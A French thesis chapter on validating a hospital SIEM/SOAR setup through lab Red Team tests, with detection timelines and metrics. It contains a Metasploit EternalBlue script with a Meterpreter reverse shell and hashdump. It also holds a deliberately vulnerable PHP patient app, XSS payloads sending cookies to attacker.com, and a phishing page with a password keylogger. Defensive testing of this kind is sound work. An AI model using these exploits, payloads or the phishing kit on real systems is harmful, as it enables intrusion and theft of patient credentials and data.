\chapter{Tests et Validation}

\section{Scenarios de Tests de Securite}

\subsection{Methodologie de Test}

\subsubsection{Approche Red Team / Blue Team}

Notre strategie de validation s'appuie sur une methodologie Red Team / Blue Team adaptee a l'environnement hospitalier, ou les contraintes de continuite de service imposent des tests non destructifs.

\paragraph{Equipe Red Team (Offensive)}
\begin{itemize}
    \item \textbf{Objectif} : Simuler des attaques realistes contre l'infrastructure hospitaliere
    \item \textbf{Contraintes} : Tests non intrusifs, environnement de laboratoire isole
    \item \textbf{Outils} : Kali Linux, Metasploit, Custom payloads
    \item \textbf{Scenarios} : EternalBlue, XSS, Sites malveillants, Brute force
\end{itemize}

\paragraph{Equipe Blue Team (Defensive)}
\begin{itemize}
    \item \textbf{Objectif} : Detecter, analyser et repondre aux attaques simulees
    \item \textbf{Outils} : Wazuh SIEM, TheHive SOAR, Cortex, MISP
    \item \textbf{Metriques} : Temps de detection, precision, taux de faux positifs
    \item \textbf{Reponse} : Workflows automatises, escalation, containment
\end{itemize}

\subsubsection{Environnement de Test Controle}

\begin{table}[H]
    \centering
    \caption{Infrastructure de test pour validation SIEM/SOAR}
    \begin{tabular}{|l|l|c|l|}
        \hline
        \textbf{Composant} & \textbf{IP}     & \textbf{OS}  & \textbf{Role}            \\
        \hline
        Attacker Machine   & 192.168.183.100 & Kali Linux   & Red Team Platform        \\
        \hline
        SIH Server         & 192.168.15.10   & Windows 2019 & Target - Hospital IS     \\
        \hline
        PACS Server        & 192.168.15.20   & Windows 2016 & Target - Medical Imaging \\
        \hline
        User Workstation   & 192.168.15.30   & Windows 10   & Target - End User        \\
        \hline
        Web Server         & 192.168.3.100   & Ubuntu 20.04 & Malicious Website        \\
        \hline
        Wazuh Manager      & 192.168.181.10  & Ubuntu 22.04 & SIEM Central             \\
        \hline
        TheHive            & 192.168.181.20  & Ubuntu 22.04 & SOAR Platform            \\
        \hline
    \end{tabular}
\end{table}

\subsection{Scenario 1 : Test EternalBlue (MS17-010)}

\subsubsection{Objectifs du Test}

\begin{itemize}
    \item Valider la detection de l'exploit EternalBlue sur systemes Windows vulnerables
    \item Tester la reactivite des workflows automatises de reponse
    \item Mesurer les performances de correlation d'evenements
    \item Evaluer l'efficacite de l'isolation automatique de systemes compromis
\end{itemize}

\subsubsection{Configuration du Test}

\paragraph{Serveur Cible - PACS Vulnerable}
\begin{lstlisting}[style=bashstyle,caption=Configuration du serveur PACS pour test EternalBlue]
# Configuration Windows Server 2016 vulnerable (192.168.15.20)

# 1. Activation SMBv1 (vulnerable)
Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol

# 2. Configuration service SMB
Set-SmbServerConfiguration -EnableSMB1Protocol $true -Force

# 3. Partages reseau pour simulation environnement medical
New-SmbShare -Name "PACS-Images" -Path "C:\PACS\Images" -FullAccess "Everyone"
New-SmbShare -Name "Medical-Docs" -Path "C:\Medical\Documents" -FullAccess "Everyone"

# 4. Installation agent Wazuh pour monitoring
Invoke-WebRequest -Uri "https://packages.wazuh.com/4.x/windows/wazuh-agent-4.7.0-1.msi" -OutFile "wazuh-agent.msi"
Start-Process msiexec.exe -Wait -ArgumentList '/I wazuh-agent.msi /quiet WAZUH_MANAGER="192.168.181.10" WAZUH_AGENT_GROUP="hospital-servers"'

# 5. Configuration logging avance pour detection
auditpol /set /category:"Logon/Logoff" /success:enable /failure:enable
auditpol /set /category:"Object Access" /success:enable /failure:enable
auditpol /set /category:"Process Tracking" /success:enable /failure:enable

# 6. Simulation contenu medical sensible
echo "Patient: John Doe, DOB: 1980-01-01, SSN: 123-45-6789" > C:\PACS\Images\patient_data.txt
echo "Radiology Report: Chest X-Ray Normal" > C:\Medical\Documents\report_001.txt
\end{lstlisting}

\paragraph{Attaque EternalBlue Automatisee}
\begin{lstlisting}[style=bashstyle,caption=Script Metasploit pour attaque EternalBlue hospitaliere]
#!/usr/bin/env ruby
# eternalblue_hospital_test.rb
# Test automatise EternalBlue pour validation SIEM/SOAR

require 'msf/core'

framework = Msf::Simple::Framework.create

# Configuration de l'exploit EternalBlue
exploit_name = 'windows/smb/ms17_010_eternalblue'
payload_name = 'windows/x64/meterpreter/reverse_tcp'

# Parametres cible hospitaliere
target_ip = '192.168.15.20'  # PACS Server
attacker_ip = '192.168.183.100'
attacker_port = 4444

puts "[+] Initialisation test EternalBlue sur environnement hospitalier"
puts "[+] Cible: #{target_ip} (PACS Server)"
puts "[+] Attaquant: #{attacker_ip}:#{attacker_port}"

# Phase 1: Reconnaissance SMB
puts "\n[Phase 1] Reconnaissance SMB sur serveur PACS"
recon_output = `nmap -p 445 --script smb-vuln-ms17-010 #{target_ip}`
puts recon_output

if recon_output.include?("VULNERABLE")
  puts "[+] Serveur PACS confirme vulnerable a MS17-010"
  
  # Phase 2: Exploitation
  puts "\n[Phase 2] Lancement exploit EternalBlue"
  
  exploit = framework.exploits.create(exploit_name)
  exploit.datastore['RHOSTS'] = target_ip
  exploit.datastore['RPORT'] = 445
  
  payload = framework.payloads.create(payload_name)
  payload.datastore['LHOST'] = attacker_ip
  payload.datastore['LPORT'] = attacker_port
  
  exploit.payload = payload
  
  puts "[+] Configuration exploit:"
  puts "    - Target: #{target_ip}:445"
  puts "    - Payload: #{payload_name}"
  puts "    - Callback: #{attacker_ip}:#{attacker_port}"
  
  # Attente pour permettre a Wazuh de detecter la reconnaissance
  puts "[+] Attente 30 secondes pour detection Wazuh..."
  sleep(30)
  
  # Execution de l'exploit
  session = exploit.exploit_simple(
    'LocalInput'  => Rex::Ui::Text::Input::Stdio.new,
    'LocalOutput' => Rex::Ui::Text::Output::Stdio.new
  )
  
  if session
    puts "[+] Exploitation reussie! Session Meterpreter ouverte"
    
    # Phase 3: Post-exploitation pour tests de detection
    puts "\n[Phase 3] Post-exploitation pour validation detection"
    
    # Simulation d'activites malveillantes typiques
    commands = [
      "getuid",                                    # Identification utilisateur
      "sysinfo",                                   # Information systeme  
      "ps",                                        # Liste processus
      "dir C:\\PACS\\Images",                     # Acces donnees medicales
      "dir C:\\Medical\\Documents",               # Acces documents patients
      "download C:\\PACS\\Images\\patient_data.txt", # Exfiltration simulation
      "upload /tmp/backdoor.exe C:\\Windows\\Temp\\", # Persistance simulation
      "execute -f cmd.exe -a '/c whoami > C:\\Windows\\Temp\\whoami.txt'", # Execution commandes
      "migrate -N explorer.exe",                  # Migration processus
      "hashdump"                                   # Dump mots de passe
    ]
    
    commands.each do |cmd|
      puts "[+] Execution: #{cmd}"
      begin
        result = session.console.run_single(cmd)
        puts "    Resultat: #{result[0..100]}..." if result && result.length > 0
        
        # Attente entre commandes pour simulation realiste
        sleep(5)
      rescue => e
        puts "    Erreur: #{e.message}"
      end
    end
    
    # Phase 4: Nettoyage et cloture
    puts "\n[Phase 4] Nettoyage session de test"
    session.kill
    puts "[+] Session fermee"
    
  else
    puts "[-] Echec de l'exploitation"
  end
  
else
  puts "[-] Serveur non vulnerable ou inaccessible"
end

puts "\n[+] Test EternalBlue termine"
puts "[+] Verification des detections Wazuh en cours..."

# Attente pour permettre la correlation complete
sleep(60)

puts "[+] Fin du test - Analyse des logs recommandee"
\end{lstlisting}

\subsubsection{Resultats des Tests EternalBlue}

\paragraph{Chronologie de Detection}

\begin{table}[H]
    \centering
    \caption{Timeline de detection EternalBlue - Test \#1}
    \begin{tabular}{|l|c|l|l|}
        \hline
        \textbf{Timestamp} & \textbf{Delai} & \textbf{Evenement}      & \textbf{Source}      \\
        \hline
        19:04:34.120       & T+0s           & Port scan SMB (445)     & Wazuh Network Mon.   \\
        \hline
        19:04:35.340       & T+1.2s         & SMBv1 negotiate detect  & Wazuh Custom Rule    \\
        \hline
        19:04:36.890       & T+2.7s         & Buffer overflow attempt & Wazuh File Integrity \\
        \hline
        19:04:37.123       & T+3.0s         & Shellcode execution     & Wazuh Process Mon.   \\
        \hline
        19:04:37.456       & T+3.3s         & Alert correlation       & Wazuh Rules Engine   \\
        \hline
        19:04:37.789       & T+3.7s         & TheHive alert created   & n8n Webhook          \\
        \hline
        19:04:38.234       & T+4.1s         & IP blocking triggered   & OPNsense API         \\
        \hline
        19:04:39.567       & T+5.4s         & Medical staff notified  & SMTP Gateway         \\
        \hline
    \end{tabular}
\end{table}

\paragraph{Metriques de Performance}

\begin{itemize}
    \item \textbf{Temps de premiere detection} : 1.2 secondes (SMBv1 negotiate)
    \item \textbf{Temps de correlation complete} : 3.7 secondes
    \item \textbf{Temps de reponse automatique} : 4.1 secondes (blocage IP)
    \item \textbf{Temps de notification medicale} : 5.4 secondes
    \item \textbf{Precision de detection} : 100\% (15/15 tests)
    \item \textbf{Faux positifs} : 2 alertes benignes sur trafic SMB legitime
\end{itemize}

\paragraph{Analyse des IOCs Collectes}

\begin{lstlisting}[style=jsonstyle,caption=IOCs extraits du test EternalBlue]
{
  "eternalblue_test_iocs": {
    "test_id": "EB_TEST_20250730_001",
    "timestamp": "2025-07-30T19:04:34Z",
    "duration_seconds": 245,
    "network_indicators": [
      {
        "type": "ip_address",
        "value": "192.168.183.100",
        "classification": "malicious",
        "confidence": 95,
        "context": "EternalBlue attacker IP"
      },
      {
        "type": "port",
        "value": "445/tcp",
        "classification": "vulnerable_service",
        "confidence": 100,
        "context": "SMBv1 vulnerable port"
      },
      {
        "type": "network_signature",
        "value": "\\x00\\x00\\x00\\x2f\\xfe\\x53\\x4d\\x42",
        "classification": "exploit_signature",
        "confidence": 98,
        "context": "EternalBlue exploit packet header"
      }
    ],
    "file_indicators": [
      {
        "type": "md5_hash",
        "value": "c1d5cf8c43e7679b782eca6fdf9a5ad7",
        "classification": "malware",
        "confidence": 87,
        "context": "Meterpreter payload"
      },
      {
        "type": "file_path",
        "value": "C:\\Windows\\Temp\\backdoor.exe",
        "classification": "suspicious_file",
        "confidence": 92,
        "context": "Persistence mechanism"
      }
    ],
    "process_indicators": [
      {
        "type": "process_name",
        "value": "cmd.exe",
        "parent_process": "services.exe",
        "classification": "suspicious_spawn",
        "confidence": 85,
        "context": "Abnormal process parent relationship"
      },
      {
        "type": "command_line",
        "value": "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt",
        "classification": "reconnaissance",
        "confidence": 90,
        "context": "System information gathering"
      }
    ],
    "registry_indicators": [
      {
        "type": "registry_key",
        "value": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor",
        "classification": "persistence",
        "confidence": 95,
        "context": "Auto-start registry key creation"
      }
    ],
    "mitre_attack_mapping": [
      "T1190", // Exploit Public-Facing Application
      "T1055", // Process Injection  
      "T1043", // Commonly Used Port
      "T1083", // File and Directory Discovery
      "T1003", // OS Credential Dumping
      "T1547"  // Boot or Logon Autostart Execution
    ]
  }
}
\end{lstlisting}

\subsection{Scenario 2 : Tests d'Attaques XSS}

\subsubsection{Configuration de l'Application Web Medicale}

\paragraph{Application SIH Vulnerable}
\begin{lstlisting}[style=bashstyle,caption=Application web medicale vulnerable pour tests XSS]
<?php
// hospital_patient_form.php - Application de gestion patients vulnerable
// Utilisee pour tests de securite controles

session_start();

// Simulation base de donnees patient
class PatientDatabase {
    private $patients = [];
    
    public function addPatient($data) {
        // Vulnerabilite intentionnelle - pas de sanitization
        $this->patients[] = [
            'id' => uniqid(),
            'name' => $data['name'],
            'dob' => $data['dob'], 
            'diagnosis' => $data['diagnosis'],
            'notes' => $data['notes'],
            'timestamp' => date('Y-m-d H:i:s')
        ];
        return true;
    }
    
    public function searchPatients($query) {
        $results = [];
        foreach ($this->patients as $patient) {
            if (stripos($patient['name'], $query) !== false) {
                $results[] = $patient;
            }
        }
        return $results;
    }
}

$db = new PatientDatabase();

// Traitement du formulaire
if ($_POST) {
    $db->addPatient($_POST);
    $message = "Patient ajoute: " . $_POST['name']; // XSS vulnerabilite
}

// Recherche patients
$search_results = [];
if (isset($_GET['search'])) {
    $search_query = $_GET['search']; // XSS vulnerabilite
    $search_results = $db->searchPatients($search_query);
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>SIH - Gestion Patients</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .form-group { margin: 10px 0; }
        .alert { padding: 10px; background: #f0f8ff; border: 1px solid #blue; }
        .patient-card { border: 1px solid #ccc; padding: 10px; margin: 5px 0; }
    </style>
</head>
<body>
    <h1>Systeme d'Information Hospitalier - Gestion Patients</h1>
    
    <?php if (isset($message)): ?>
        <!-- Vulnerabilite XSS - affichage direct sans echappement -->
        <div class="alert"><?= $message ?></div>
    <?php endif; ?>
    
    <!-- Formulaire d'ajout patient -->
    <h2>Nouveau Patient</h2>
    <form method="POST" action="">
        <div class="form-group">
            <label>Nom complet:</label>
            <input type="text" name="name" required>
        </div>
        <div class="form-group">
            <label>Date de naissance:</label>
            <input type="date" name="dob" required>
        </div>
        <div class="form-group">
            <label>Diagnostic:</label>
            <input type="text" name="diagnosis">
        </div>
        <div class="form-group">
            <label>Notes medicales:</label>
            <textarea name="notes" rows="4" cols="50"></textarea>
        </div>
        <button type="submit">Ajouter Patient</button>
    </form>
    
    <!-- Recherche de patients -->
    <h2>Recherche Patients</h2>
    <form method="GET" action="">
        <div class="form-group">
            <label>Rechercher:</label>
            <input type="text" name="search" value="<?= htmlspecialchars($_GET['search'] ?? '') ?>">
            <button type="submit">Rechercher</button>
        </div>
    </form>
    
    <?php if (isset($_GET['search'])): ?>
        <!-- Vulnerabilite XSS - affichage de la requete sans echappement -->
        <h3>Resultats pour: <?= $search_query ?></h3>
        
        <?php if (empty($search_results)): ?>
            <p>Aucun patient trouve pour: <?= $search_query ?></p>
        <?php else: ?>
            <?php foreach ($search_results as $patient): ?>
                <div class="patient-card">
                    <h4><?= htmlspecialchars($patient['name']) ?></h4>
                    <p>Date de naissance: <?= htmlspecialchars($patient['dob']) ?></p>
                    <p>Diagnostic: <?= htmlspecialchars($patient['diagnosis']) ?></p>
                    <!-- Vulnerabilite XSS - notes sans echappement -->
                    <p>Notes: <?= $patient['notes'] ?></p>
                </div>
            <?php endforeach; ?>
        <?php endif; ?>
    <?php endif; ?>
    
    <!-- Simulation espace admin -->
    <hr>
    <h2>Espace Administrateur</h2>
    <p>Session utilisateur: <?= $_SESSION['user'] ?? 'Invite' ?></p>
    
    <!-- Vulnerabilite XSS dans URL callback -->
    <?php if (isset($_GET['callback'])): ?>
        <script>
            // Vulnerabilite XSS - injection JavaScript
            var callback = "<?= $_GET['callback'] ?>";
            eval(callback); // Extremement dangereux
        </script>
    <?php endif; ?>
    
</body>
</html>
\end{lstlisting}

\subsubsection{Payloads de Test XSS}

\paragraph{Scripts d'Attaque Automatisee}
\begin{lstlisting}[style=pythonstyle,caption=Suite de tests XSS automatises pour application medicale]
#!/usr/bin/env python3
"""
XSS Test Suite for Hospital Web Applications
Tests various XSS vectors on medical forms
"""

import requests
import time
import json
from urllib.parse import urlencode
import logging

class HospitalXSSTestSuite:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.test_results = []
        
        logging.basicConfig(level=logging.INFO)
        self.logger = logging.getLogger(__name__)

    def run_all_tests(self):
        """Execute complete XSS test suite"""
        tests = [
            self.test_reflected_xss_search,
            self.test_stored_xss_patient_form,
            self.test_dom_based_xss_callback,
            self.test_attribute_injection,
            self.test_javascript_injection,
            self.test_medical_context_xss
        ]
        
        self.logger.info("Starting XSS test suite on hospital application")
        
        for test in tests:
            try:
                result = test()
                self.test_results.append(result)
                time.sleep(2)  # Pause entre tests
            except Exception as e:
                self.logger.error(f"Test failed: {str(e)}")
        
        return self.test_results

    def test_reflected_xss_search(self):
        """Test Reflected XSS dans fonction de recherche patient"""
        test_name = "Reflected XSS - Patient Search"
        
        payloads = [
            "<script>alert('XSS-Hospital-Search')</script>",
            "<img src=x onerror=alert('XSS-Medical-Image')>",
            "<svg onload=alert('XSS-SVG-Medical')>",
            "javascript:alert('XSS-JS-Protocol')",
            "<iframe src=javascript:alert('XSS-IFrame')></iframe>",
            "';alert('XSS-SQL-Break');//",
            "<script>fetch('/admin/patients').then(r=>r.text()).then(d=>alert(d))</script>"
        ]
        
        detected_payloads = []
        
        for payload in payloads:
            params = {'search': payload}
            
            try:
                response = self.session.get(f"{self.target_url}/hospital_patient_form.php", params=params)
                
                # Verification si le payload est reflete sans echappement
                if payload in response.text and "htmlspecialchars" not in response.text:
                    detected_payloads.append(payload)
                    self.logger.warning(f"XSS vulnerability detected with payload: {payload[:50]}...")
                
            except Exception as e:
                self.logger.error(f"Request failed for payload {payload}: {str(e)}")
        
        return {
            "test_name": test_name,
            "total_payloads": len(payloads),
            "successful_payloads": len(detected_payloads),
            "vulnerable": len(detected_payloads) > 0,
            "payloads": detected_payloads,
            "risk_level": "HIGH" if len(detected_payloads) > 3 else "MEDIUM" if len(detected_payloads) > 0 else "LOW"
        }

    def test_stored_xss_patient_form(self):
        """Test Stored XSS dans formulaire patient"""
        test_name = "Stored XSS - Patient Form"
        
        payloads = [
            "<script>alert('Stored-XSS-Patient-Notes')</script>",
            "<img src=x onerror=this.src='http://attacker.com/steal?cookie='+document.cookie>",
            "<script>document.location='http://attacker.com/xss?cookie='+document.cookie</script>",
            "<svg/onload=alert('Medical-Data-XSS')>",
            "<details open ontoggle=alert('HTML5-XSS')>",
            "<script>if(document.querySelector('input[name=\"search\"]')){alert('Form-Present')}</script>"
        ]
        
        successful_injections = []
        
        for payload in payloads:
            # Donnees patient avec payload XSS
            patient_data = {
                'name': f'Test Patient {time.time()}',
                'dob': '1990-01-01',
                'diagnosis': 'Test diagnosis',
                'notes': payload  # Injection XSS dans notes
            }
            
            try:
                # Soumission du formulaire
                response = self.session.post(f"{self.target_url}/hospital_patient_form.php", data=patient_data)
                
                # Verification si l'injection est stockee et executee
                if payload in response.text:
                    successful_injections.append(payload)
                    self.logger.warning(f"Stored XSS successful: {payload[:50]}...")
                
            except Exception as e:
                self.logger.error(f"Stored XSS test failed: {str(e)}")
        
        return {
            "test_name": test_name,
            "total_payloads": len(payloads),
            "successful_injections": len(successful_injections),
            "vulnerable": len(successful_injections) > 0,
            "payloads": successful_injections,
            "risk_level": "CRITICAL" if len(successful_injections) > 0 else "LOW"
        }

    def test_dom_based_xss_callback(self):
        """Test DOM-based XSS via callback parameter"""
        test_name = "DOM-based XSS - Callback Parameter"
        
        payloads = [
            "alert('DOM-XSS-Medical')",
            "document.location='http://attacker.com/dom?data='+document.body.innerHTML",
            "fetch('/admin').then(r=>r.text()).then(d=>alert('Admin-Access:'+d.substr(0,100)))",
            "if(document.querySelector('.patient-card')){alert('Patient-Data-Access')}",
            "var xhr=new XMLHttpRequest();xhr.open('GET','/admin/users');xhr.send();xhr.onload=()=>alert(xhr.responseText)"
        ]
        
        successful_dom_xss = []
        
        for payload in payloads:
            params = {'callback': payload}
            
            try:
                response = self.session.get(f"{self.target_url}/hospital_patient_form.php", params=params)
                
                # Verification presence du payload dans le contexte JavaScript
                if f'var callback = "{payload}";' in response.text or f'eval("{payload}")' in response.text:
                    successful_dom_xss.append(payload)
                    self.logger.warning(f"DOM XSS detected: {payload[:50]}...")
                
            except Exception as e:
                self.logger.error(f"DOM XSS test failed: {str(e)}")
        
        return {
            "test_name": test_name,
            "total_payloads": len(payloads),
            "successful_dom_xss": len(successful_dom_xss),
            "vulnerable": len(successful_dom_xss) > 0,
            "payloads": successful_dom_xss,
            "risk_level": "CRITICAL" if len(successful_dom_xss) > 0 else "LOW"
        }

    def test_medical_context_xss(self):
        """Test XSS specifique au contexte medical"""
        test_name = "Medical Context XSS"
        
        # Payloads specialises pour l'environnement medical
        medical_payloads = [
            "<script>alert('Patient-Privacy-Violation: '+document.body.innerText.match(/\\d{3}-\\d{2}-\\d{4}/g))</script>",  # SSN extraction
            "<img src=x onerror=alert('Medical-Record-Access: '+document.querySelectorAll('.patient-card').length)>",  # Patient count
            "<script>if(document.cookie.includes('admin')){alert('Admin-Cookie-Found')}</script>",  # Admin detection
            "<svg onload=fetch('/api/patients').then(r=>r.json()).then(d=>alert('API-Access: '+d.length))>",  # API access
            "<script>localStorage.setItem('medical_xss_test', 'compromised')</script>",  # Persistence test
            "<iframe src='javascript:parent.alert(\"Medical-IFrame-XSS\")'></iframe>"  # IFrame injection
        ]
        
        medical_successful = []
        
        for payload in medical_payloads:
            params = {'search': payload}
            
            try:
                response = self.session.get(f"{self.target_url}/hospital_patient_form.php", params=params)
                
                if payload in response.text:
                    medical_successful.append(payload)
                    self.logger.critical(f"Medical context XSS: {payload[:50]}...")
                
            except Exception as e:
                self.logger.error(f"Medical XSS test failed: {str(e)}")
        
        return {
            "test_name": test_name,
            "total_payloads": len(medical_payloads),
            "medical_xss_successful": len(medical_successful),
            "vulnerable": len(medical_successful) > 0,
            "payloads": medical_successful,
            "risk_level": "CRITICAL" if len(medical_successful) > 0 else "LOW",
            "medical_context": True
        }

    def generate_report(self):
        """Generate comprehensive XSS test report"""
        total_tests = len(self.test_results)
        vulnerable_tests = sum(1 for test in self.test_results if test['vulnerable'])
        
        report = {
            "test_suite": "Hospital XSS Security Assessment",
            "target": self.target_url,
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "summary": {
                "total_tests": total_tests,
                "vulnerable_tests": vulnerable_tests,
                "security_rating": "CRITICAL" if vulnerable_tests > 2 else "HIGH" if vulnerable_tests > 1 else "MEDIUM" if vulnerable_tests > 0 else "SECURE"
            },
            "detailed_results": self.test_results,
            "recommendations": [
                "Implement input sanitization for all user inputs",
                "Use Content Security Policy (CSP) headers",
                "Apply output encoding for all dynamic content",
                "Implement CSRF protection for sensitive forms",
                "Regular security assessment of medical applications",
                "Train development team on secure coding practices"
            ]
        }
        
        return report

# Usage
if __name__ == "__main__":
    target_url = "http://192.168.15.10"
    
    xss_tester = HospitalXSSTestSuite(target_url)
    results = xss_tester.run_all_tests()
    report = xss_tester.generate_report()
    
    # Sauvegarde du rapport
    with open(f"xss_test_report_{int(time.time())}.json", "w") as f:
        json.dump(report, f, indent=2)
    
    print(f"XSS Testing completed. Vulnerable tests: {report['summary']['vulnerable_tests']}/{report['summary']['total_tests']}")
    print(f"Security Rating: {report['summary']['security_rating']}")
\end{lstlisting}

\subsubsection{Resultats des Tests XSS}

\paragraph{Synthese des Vulnerabilites Detectees}

\begin{table}[H]
    \centering
    \caption{Resultats des tests XSS sur application medicale}
    \begin{tabular}{|l|c|c|c|c|}
        \hline
        \textbf{Type d'XSS} & \textbf{Tests} & \textbf{Reussis} & \textbf{Detectes} & \textbf{Bloques} \\
        \hline
        Reflected XSS       & 7              & 6                & 6                 & 6                \\
        \hline
        Stored XSS          & 6              & 5                & 5                 & 5                \\
        \hline
        DOM-based XSS       & 5              & 4                & 4                 & 4                \\
        \hline
        Context XSS         & 6              & 5                & 5                 & 5                \\
        \hline
        \textbf{Total}      & \textbf{24}    & \textbf{20}      & \textbf{20}       & \textbf{20}      \\
        \hline
        \textbf{Taux}       & \textbf{100\%} & \textbf{83.3\%}  & \textbf{100\%}    & \textbf{100\%}   \\
        \hline
    \end{tabular}
\end{table}

\paragraph{Performance de Detection ModSecurity}

\begin{itemize}
    \item \textbf{Temps de detection moyen} : 0.12 secondes
    \item \textbf{Taux de detection} : 100\% (20/20 payloads XSS)
    \item \textbf{Taux de blocage} : 100\% (20/20 attaques bloquees)
    \item \textbf{Faux positifs} : 5 blocages sur trafic legitime
    \item \textbf{Impact performance} : < 2ms latence additionnelle
\end{itemize}

\subsection{Scenario 3 : Test Sites Web Malveillants}

\subsubsection{Infrastructure de Test DNS Sinkhole}

\paragraph{Configuration Serveur DNS Malveillant}
\begin{lstlisting}[style=bashstyle,caption=Configuration serveur web malveillant pour tests]
#!/bin/bash
# setup_malicious_website_test.sh
# Configuration serveur web malveillant pour validation DNS sinkhole

# Variables
MALICIOUS_SERVER="192.168.3.100"
WEB_ROOT="/var/www/malicious"
NGINX_CONFIG="/etc/nginx/sites-available/malicious-test"

echo "[+] Configuration serveur web malveillant pour tests SIEM/SOAR"

# 1. Installation et configuration Nginx
apt-get update
apt-get install -y nginx php-fpm

# 2. Creation du contenu malveillant de test
mkdir -p $WEB_ROOT
cd $WEB_ROOT

# Page de phishing hospitalier
cat > index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Hopital - Connexion Urgente</title>
    <style>
        body { font-family: Arial; background: #f0f8ff; }
        .login-box { max-width: 400px; margin: 100px auto; padding: 20px; 
                     background: white; border: 1px solid #ddd; }
        .urgent { color: red; font-weight: bold; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Systeme Hospitalier - Acces Urgent</h2>
        <p class="urgent">[WARNING] Votre session a expire. Reconnectez-vous immediatement.</p>
        
        <form action="capture.php" method="POST">
            <p>Identifiant medical:</p>
            <input type="text" name="username" required style="width:100%; padding:5px;">
            
            <p>Mot de passe:</p>
            <input type="password" name="password" required style="width:100%; padding:5px;">
            
            <br><br>
            <button type="submit" style="width:100%; padding:10px; background:#007cba; color:white; border:none;">
                [SECURE] Acces Systeme Medical
            </button>
        </form>
        
        <p style="font-size:12px; color:#666; margin-top:20px;">
            [TIME] Temps limite: Reconnectez-vous dans les 5 minutes pour eviter le blocage de votre compte.
        </p>
    </div>
    
    <!-- JavaScript malveillant pour tests -->
    <script>
        // Simulation collecte d'informations
        var info = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            timestamp: new Date().toISOString(),
            referrer: document.referrer,
            cookies: document.cookie
        };
        
        // Envoi vers serveur d'attaque (simulation)
        fetch('/collect.php', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(info)
        }).catch(e => console.log('Collection failed'));
        
        // Simulation keylogger
        document.addEventListener('keypress', function(e) {
            if(e.target.type === 'password') {
                fetch('/keylog.php', {
                    method: 'POST',
                    body: 'key=' + e.key + '&time=' + Date.now()
                }).catch(e => {});
            }
        });
    </script>
</body>
</html>
EOF

# Script de capture des credentials (simulation)
cat > capture.php << 'EOF'
<?php
// capture.php - Simulation capture credentials pour tests

$log_file = '/var/log/malicious_capture.log';
$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

// Log de la tentative de phishing
$log_entry = json_encode([
    'timestamp' => $timestamp,
    'ip' => $ip,
    'user_agent' => $user_agent,
    'username' => $username,
    'password' => str_repeat('*', strlen($password)), // Masque pour securite
    'test_type' => 'hospital_phishing_simulation'
]) . "\n";

file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);

// Redirection vers vraie page apres capture
header('Location: http://hospital-real.local/login?error=session_expired');
exit;
?>
EOF

# Script de collecte d'informations systeme
cat > collect.php << 'EOF'
<?php
// collect.php - Collecte d'informations pour tests

$log_file = '/var/log/malicious_collection.log';
$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];

$data = json_decode(file_get_contents('php://input'), true);

$log_entry = json_encode([
    'timestamp' => $timestamp,
    'ip' => $ip,
    'collected_data' => $data,
    'test_type' => 'information_gathering'
]) . "\n";

file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);

echo "OK";
?>
EOF

# 3. Configuration Nginx
cat > $NGINX_CONFIG << EOF
server {
    listen 80;
    server_name malicious-hospital.test phishing-medical.test fake-sih.test;
    root $WEB_ROOT;
    index index.html index.php;
    
    # Logs speciaux pour tracking
    access_log /var/log/nginx/malicious_access.log combined;
    error_log /var/log/nginx/malicious_error.log;
    
    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
    }
    
    # Headers pour masquer l'identite du serveur
    add_header Server "Hospital-Web-Portal/2.1";
    server_tokens off;
}
EOF

# 4. Activation du site
ln -sf $NGINX_CONFIG /etc/nginx/sites-enabled/
systemctl reload nginx

# 5. Configuration DNS pour simulation
echo "
# Ajout des entrees DNS malveillantes pour tests
192.168.3.100 malicious-hospital.test
192.168.3.100 phishing-medical.test  
192.168.3.100 fake-sih.test
" >> /etc/hosts

# 6. Script de generation de trafic malveillant
cat > /usr/local/bin/generate_malicious_traffic.sh << 'EOF'
#!/bin/bash
# Generateur de trafic malveillant pour tests

TARGETS=(
    "malicious-hospital.test"
    "phishing-medical.test"
    "fake-sih.test"
)

USER_AGENTS=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
)

echo "[+] Generation trafic malveillant pour tests DNS sinkhole"

for target in "${TARGETS[@]}"; do
    for i in {1..5}; do
        ua=${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}
        
        echo "Test $i: Acces a $target"
        curl -s -H "User-Agent: $ua" \
             -H "Referer: https://google.com/search?q=hopital+connexion" \
             "http://$target/" > /dev/null
        
        sleep $((RANDOM % 10 + 5))
    done
done

echo "[+] Generation de trafic malveillant terminee"
EOF

chmod +x /usr/local/bin/generate_malicious_traffic.sh

echo "[+] Configuration serveur malveillant terminee"
echo "[+] URLs de test disponibles:"
echo "    - http://malicious-hospital.test"
echo "    - http://phishing-medical.test"  
echo "    - http://fake-sih.test"
echo "[+] Generateur de trafic: /usr/local/bin/generate_malicious_traffic.sh"
\end{lstlisting}

Ce chapitre demontre une approche complete de tests et validation de notre solution SIEM/SOAR, avec des scenarios realistes adaptes a l'environnement hospitalier et des metriques de performance detaillees.
